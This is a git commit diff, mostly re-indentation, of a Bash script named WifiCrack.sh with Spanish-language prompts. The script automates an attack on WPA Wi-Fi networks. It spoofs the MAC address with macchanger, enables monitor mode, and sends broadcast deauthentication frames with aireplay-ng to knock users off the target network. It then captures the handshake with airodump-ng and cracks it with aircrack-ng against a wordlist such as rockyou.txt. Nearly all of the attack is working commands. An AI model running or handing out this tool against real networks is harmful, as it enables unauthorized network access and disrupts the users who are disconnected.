69a58bf5f744a4228dce68d6fa483cd202396af7
Ruben Gomez <santiagogomezgarro@gmail.com>
2023-02-07 14:27:20 -0600

    line

--- WifiCrack.sh
+++ WifiCrack.sh
@@ -44,49 +44,49 @@ if [ $airtest -eq 0 ]; then
 		iwconfig | awk '$1~/^[a-z]+[0-9]+/{print $1}'
 			echo -e "${blueColour}"
 			read -p "[?] Que tarjeta deseas usar: " tar
-			$cleancolor
-			echo -e "\n${redColour}[*] Se esta iniciando el modo monitor y cambiando tu dirrecion MAC en $tar\n"
-			airmon-ng start $tar > /dev/null 2>&1
-			ifconfig ${tar}mon down && macchanger -a ${tar}mon > /dev/null 2>&1
-			ifconfig ${tar}mon up
-			airmon-ng check kill > /dev/null 2>&1
-			echo -e "\n${yellowColour}[*] Nueva direccion MAC asignada: $(macchanger -s ${tar}mon | grep -i current | xargs | cut -d ' ' -f '3-100')"
-			echo -e "\n${greenColour}[*] Ya tienes tu tarjeta preparada!\n"
-			read -p "[?] Quieres hacer un ataque? [Y/N]: " rps
 				$cleancolor
-				if [ "$rps" == "Y" ] || [ "$rps" == "y" ]; then
-					xterm -hold -e "airodump-ng ${tar}mon" &
-					airodump_xterm_PID=$!
-					echo -e "$grayColour"
-					read -p "[?] Que red deseas atacar?: " ap
-					read -p "[?] En que canal esta ${ap}?: " channel
+				echo -e "\n${redColour}[*] Se esta iniciando el modo monitor y cambiando tu dirrecion MAC en $tar\n"
+				airmon-ng start $tar > /dev/null 2>&1
+				ifconfig ${tar}mon down && macchanger -a ${tar}mon > /dev/null 2>&1
+				ifconfig ${tar}mon up
+				airmon-ng check kill > /dev/null 2>&1
+				echo -e "\n${yellowColour}[*] Nueva direccion MAC asignada: $(macchanger -s ${tar}mon | grep -i current | xargs | cut -d ' ' -f '3-100')"
+				echo -e "\n${greenColour}[*] Ya tienes tu tarjeta preparada!\n"
+				read -p "[?] Quieres hacer un ataque? [Y/N]: " rps
 					$cleancolor
-					echo -e "${greenColour}[*] Se esta desautenticando a los usuarios de la red"
-					$cleancolor
-					kill -9 $airodump_xterm_PID
-					wait $airodump_xterm_PID 2>/dev/null
+					if [ "$rps" == "Y" ] || [ "$rps" == "y" ]; then
+						xterm -hold -e "airodump-ng ${tar}mon" &
+						airodump_xterm_PID=$!
+						echo -e "$grayColour"
+						read -p "[?] Que red deseas atacar?: " ap
+						read -p "[?] En que canal esta ${ap}?: " channel
+						$cleancolor
+						echo -e "${greenColour}[*] Se esta desautenticando a los usuarios de la red"
+						$cleancolor
+						kill -9 $airodump_xterm_PID
+						wait $airodump_xterm_PID 2>/dev/null
 
-					xterm -hold -e "airodump-ng -c $channel -w Handshake --essid $ap ${tar}mon" &
-					airodump_filter_xterm_PID=$?
+						xterm -hold -e "airodump-ng -c $channel -w Handshake --essid $ap ${tar}mon" &
+						airodump_filter_xterm_PID=$?
 
-					sleep 5; xterm -hold -e "aireplay-ng -0 10 -e $ap -c FF:FF:FF:FF:FF:FF ${tar}mon" &								
-					aireplay_xterm_PID=$!
-					sleep 10; kill -9 $aireplay_xterm_PID; wait $aireplay_xterm_PID 2>/dev/null
+						sleep 5; xterm -hold -e "aireplay-ng -0 10 -e $ap -c FF:FF:FF:FF:FF:FF ${tar}mon" &								
+						aireplay_xterm_PID=$!
+						sleep 10; kill -9 $aireplay_xterm_PID; wait $aireplay_xterm_PID 2>/dev/null
 
-					echo -e "${redColour}\n[...] Esperando Handshake\n"
+						echo -e "${redColour}\n[...] Esperando Handshake\n"
+						$cleancolor
+						
+						sleep 10
+						echo -e "\n${yellowColour}[*] Ruta de rockyou.txt: /usr/share/wordlists/rockyou.txt"
+						read -p "[?] Ruta del Diccionario al usar: " dicc
+						$cleancolor
+						xterm -hold -e "aircrack-ng -w $dicc Handshake-01.cap"
+					fi
+				if [ "$rps" == "N" ] || [ "$rps" == "n" ]; then
+					echo -e "${redColour}\n[!] Saliendo"
 					$cleancolor
-					
-					sleep 10
-					echo -e "\n${yellowColour}[*] Ruta de rockyou.txt: /usr/share/wordlists/rockyou.txt"
-					read -p "[?] Ruta del Diccionario al usar: " dicc
-					$cleancolor
-					xterm -hold -e "aircrack-ng -w $dicc Handshake-01.cap"
+					break
 				fi
-			if [ "$rps" == "N" ] || [ "$rps" == "n" ]; then
-				echo -e "${redColour}\n[!] Saliendo"
-				$cleancolor
-				break
-			fi
 else
 	tool_name="aircrack-ng"
 	tool_name2="macchanger"
